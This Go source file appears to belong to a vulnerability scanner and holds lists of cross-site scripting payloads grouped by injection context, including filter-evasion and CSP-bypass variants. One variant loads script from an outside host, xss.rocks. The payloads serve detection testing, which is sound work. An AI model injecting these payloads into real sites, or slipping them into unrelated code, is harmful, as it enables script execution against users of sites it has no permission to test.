package scanner

type XSSContext int

const (
	XSSContextUnknown XSSContext = iota
	XSSContextHTMLBody
	XSSContextAttribute
	XSSContextJSBlock
	XSSContextEventHandler
)

// All payloads below are from https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
// with %CANARY% as a marker for detection

var (
	htmlBodyPayloads = []string{
		`<svg/onload=alert('%CANARY%')>`,
		`<img src=x onerror=alert('%CANARY%')>`,
		`<iframe src="javascript:alert('%CANARY%')"></iframe>`,
		`<math href="javascript:alert('%CANARY%')">CLICK`,
		`<audio src/onerror=alert('%CANARY%')>`,
		`<video><source onerror="alert('%CANARY%')">`,
		`<details open ontoggle="alert('%CANARY%')">`,
		`<marquee onstart=alert('%CANARY%')>`,
		`<body onload=alert('%CANARY%')>`,
		`<svg><script>alert('%CANARY%')</script></svg>`,
		`<object data="javascript:alert('%CANARY%')">`,
		`<input autofocus onfocus=alert('%CANARY%')>`,
		`<a href="javascript:alert('%CANARY%')">X</a>`,
		`<img src="x" onerror="prompt('%CANARY%')">`,
		`<svg><a xlink:href="javascript:alert('%CANARY%')">X</a></svg>`,
		`<image src="x" onerror="alert('%CANARY%')">`,
		`<svg><desc><![CDATA[</desc><script>alert('%CANARY%')</script>]]></svg>`,
		`<svg><foreignObject onload=alert('%CANARY%')></svg>`,
		`<isindex type="image" src="1" onerror="alert('%CANARY%')">`,
		`<img src="javascript:alert('%CANARY%');">`,
		`<b onmouseover=alert('%CANARY%')>MOVE</b>`,
		`<div id="x" style="position:absolute;top:0;left:0;width:100%;height:100%" onclick="alert('%CANARY%')"></div>`,
		`<button formaction="javascript:alert('%CANARY%')" autofocus>CLICK`,
		`<math><a xlink:href="javascript:alert('%CANARY%')">CLICK</a></math>`,
		`<form onformdata="alert('%CANARY%')"><button type="submit"></form>`,
		`<iframe srcdoc="<script>alert('%CANARY%')</script>"></iframe>`,
		`<svg><animate onbegin=alert('%CANARY%') attributeName=x dur=1s></svg>`,
		`<svg><set onbegin=alert('%CANARY%') attributeName=x to=1></svg>`,
	}

	attributePayloads = []string{
		`" onmouseover=alert('%CANARY%') x="`,
		`' onmouseover=alert('%CANARY%') x='`,
		`" autofocus onfocus=alert('%CANARY%') x="`,
		`" onclick=alert('%CANARY%') x="`,
		`' onclick=alert('%CANARY%') x='`,
		`" style="background:url(javascript:alert('%CANARY%'))"`,
		`" style=animation-name:x onanimationstart=alert('%CANARY%') x="`,
		`" onanimationend=alert('%CANARY%') x="`,
		`" onpointerdown=alert('%CANARY%') x="`,
		`" onpointerup=alert('%CANARY%') x="`,
		`" onpointerover=alert('%CANARY%') x="`,
		`" onpointerenter=alert('%CANARY%') x="`,
		`" onpointerleave=alert('%CANARY%') x="`,
		`" onpointermove=alert('%CANARY%') x="`,
		`" ontoggle=alert('%CANARY%') x="`,
		`" onauxclick=alert('%CANARY%') x="`,
		`" ontransitionend=alert('%CANARY%') x="`,
		`" onbeforeprint=alert('%CANARY%') x="`,
		`" onafterprint=alert('%CANARY%') x="`,
		`" onbeforeunload=alert('%CANARY%') x="`,
		`" onhashchange=alert('%CANARY%') x="`,
		`" onlanguagechange=alert('%CANARY%') x="`,
		`" onmessage=alert('%CANARY%') x="`,
		`" onoffline=alert('%CANARY%') x="`,
		`" ononline=alert('%CANARY%') x="`,
		`" onpagehide=alert('%CANARY%') x="`,
		`" onpageshow=alert('%CANARY%') x="`,
		`" onpopstate=alert('%CANARY%') x="`,
		`" onstorage=alert('%CANARY%') x="`,
		`" onunload=alert('%CANARY%') x="`,
	}

	jsBlockPayloads = []string{
		`';alert('%CANARY%');//`,
		`";alert('%CANARY%');//`,
		`';confirm('%CANARY%');//`,
		`";confirm('%CANARY%');//`,
		`';prompt('%CANARY%');//`,
		`";prompt('%CANARY%');//`,
		`');alert(String.fromCharCode(88,83,83))//`,
		`");alert(String.fromCharCode(88,83,83))//`,
		`';window[1337]=1;//`,
		`';document.write('<img src=x onerror=alert("%CANARY%")>');//`,
		`";document.write('<img src=x onerror=alert('%CANARY%')>');//`,
		`'-alert('%CANARY%')-`,
		`"--><svg/onload=alert('%CANARY%')>//`,
	}

	eventHandlerPayloads = []string{
		`javascript:alert('%CANARY%')`,
		`javascript:confirm('%CANARY%')`,
		`javascript:prompt('%CANARY%')`,
		`javascript:alert(String.fromCharCode(88,83,83))`,
		`javascript:window.onerror=alert('%CANARY%')`,
		`javascript:document.body.innerHTML='<img src=x onerror=alert("%CANARY%")>'`,
	}

	genericPayloads = []string{
		`<script>alert('%CANARY%')</script>`,
		`<img src=x onerror=alert('%CANARY%')>`,
		`<svg/onload=alert('%CANARY%')>`,
		`<svg><script>alert('%CANARY%')</script></svg>`,
		`"><img src=x onerror=alert('%CANARY%')>`,
		`<body onload=alert('%CANARY%')>`,
		`"><svg/onload=confirm('%CANARY%')>`,
		`"><math><a href="javascript:alert('%CANARY%')">CLICK`,
		`<style/onload=alert('%CANARY%')>`,
		`<input onfocus=alert('%CANARY%') autofocus>`,
		`<iframe src="javascript:alert('%CANARY%');"></iframe>`,
		`<img src=1 href=1 onerror="alert('%CANARY%')">`,
		`<svg><desc><![CDATA[</desc><script>alert('%CANARY%')</script>]]></svg>`,
		`<marquee onstart=alert('%CANARY%')>`,
		`<form><button formaction="javascript:alert('%CANARY%')">CLICK</button></form>`,
		`<isindex type="image" src="1" onerror="alert('%CANARY%')">`,
		`<div id=x style="position:absolute;top:0;left:0;width:100%;height:100%" onclick="alert('%CANARY%')"></div>`,
		`<math><a xlink:href="javascript:alert('%CANARY%')">CLICK</a></math>`,
		`<iframe srcdoc="<script>alert('%CANARY%')</script>"></iframe>`,
	}

	cspBypassPayloads = []string{
		`<script src='//xss.rocks/csp.js'></script>`,
		`<img src="x:alert(1)" onerror=eval(atob('YWxlcnQoJ2NzccKpJyk='))>`,
		`<svg><script xlink:href=data:,alert(1)>`,
		`<script src=data:text/javascript,alert(%27CSPBYPASS%27)>`,
		`<form><button formaction="javascript:alert('CSPBYPASS')">CLICK</button></form>`,
		`"><iframe srcdoc="<script>alert('CSPBYPASS')</script>">`,
		`<iframe src="data:text/html,<script>alert('CSPBYPASS')</script>"></iframe>`,
		`<script src="data:text/javascript;base64,YWxlcnQoJ0NTUEJZUEFTUycpKTs="></script>`,
	}

	wafBypassPayloads = []string{
		`<sCript>alert('%CANARY%')</scriPt>`,
		`<script >alert('%CANARY%')</script >`,
		`<scr<script>ipt>alert('%CANARY%')</scr<script>ipt>`,
		`<img src=x onerror=&#97;lert('%CANARY%')>`,
		`<svg/onload=/**/alert('%CANARY%')>`,
		`<svg/onload=(alert)('%CANARY%')>`,
		`<svg/onload='alert(String.fromCharCode(88,83,83))'>`,
		`<img src=x onerror=eval('ale'+'rt(%27%25CANARY%25%27)')>`,
		`<img src=x onerror=window['al'+'ert']('%CANARY%')>`,
		`<img src=x onerror=(new Function('ale'+'rt(%27%25CANARY%25%27)'))()>`,
		`<img src=x onerror=top['al'+'ert']('%CANARY%')>`,
		`<svg/onload=top['al'+'ert']('%CANARY%')>`,
		`<svg/onload=(window['al'+'ert'])('%CANARY%')>`,
		`<img src=x onerror=window[String.fromCharCode(97,108,101,114,116)]('%CANARY%')>`,
		`<svg/onload=window[String.fromCharCode(97,108,101,114,116)]('%CANARY%')>`,
	}
)